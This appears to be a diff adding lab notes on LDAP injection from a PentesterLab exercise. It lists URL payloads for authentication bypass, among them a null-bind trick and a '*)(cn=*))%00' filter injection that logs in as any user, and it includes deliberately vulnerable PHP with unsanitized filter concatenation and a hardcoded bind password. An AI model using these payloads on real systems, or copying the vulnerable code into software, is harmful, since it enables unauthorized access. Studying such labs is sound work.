@@ -1,0 +1,63 @@
+#### Example 1
+
+Payloads:
+```
+$target/example1.php?username=&password=
+$target/example1.php
+```
+Bypass authentication with binding of NULL values (parameters should be removed from request to be null)
+
+```
+$ld = ldap_connect("ldap://localhost:389") or die("Could not connect to LDAP server");
+ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
+ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
+if ($ld) {
+    if (isset($_GET["username"])) {
+        $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
+    }
+    $lb = @ldap_bind($ld, $user,$_GET["password"]);
+    echo  $lb ? "AUTHENTICATED" : "NOT AUTHENTICATED";
+}
+```
+
+#### Example 2
+
+Payloads:
+```
+$target/example2.php?name=hacker&password=hacker
+$target/example2.php?name=h*&password=hacker
+$target/example2.php?name=hacker&password=hac* (password is hashed)
+$target/example2.php?name=hacker&password[]= (Warning: md5() expects parameter 1 to be string, array given)
+$target/example2.php?name=*)(cn=*))%00&password=random (login as any user)
+```
+
+Code:
+```php
+$ld = ldap_connect("ldap://localhost:389") or die("Could not connect to LDAP server");
+ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
+ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
+
+if ($ld) {
+  $lb = @ldap_bind($ld, "cn=admin,dc=pentesterlab,dc=com", "pentesterlab");
+    if ($lb) {
+      $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
+      $filter = "(&(cn=".$_GET['name'].")(userPassword=".$pass."))";
+      if (!($search=@ldap_search($ld, "ou=people,dc=pentesterlab,dc=com", $filter))) {
+      echo("Unable to search ldap server<br>");
+      echo("msg:'".ldap_error($ld)."'</br>");
+    } else {
+      $number_returned = ldap_count_entries($ld,$search);
+      
+      $info = ldap_get_entries($ld, $search);
+
+      if ($info["count"] < 1) {
+         echo "UNAUTHENTICATED";
+      }
+      else {
+        echo "AUTHENTICATED as";
+        echo(" ".htmlentities($info[0]['uid'][0]));
+      }
+    }
+  }
+}
+```
